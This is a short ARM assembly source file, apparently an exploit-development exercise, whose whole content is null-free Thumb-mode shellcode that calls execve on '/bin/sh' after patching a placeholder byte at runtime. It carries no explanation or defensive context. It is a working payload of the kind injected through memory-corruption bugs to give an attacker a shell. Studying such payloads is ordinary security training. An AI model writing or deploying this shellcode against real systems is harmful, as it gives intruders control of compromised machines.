.section .text
.global _start

_start:
	.code 32
	add	r3, pc, #1
	bx	r3
	
	.code 16
	adr    r0, binsh	
	sub	r1, r1
	mov	r2, r1
	strb	r2, [r0, #7]
	mov	r7, #11
	svc	#1

binsh:
.ascii	"/bin/shX"
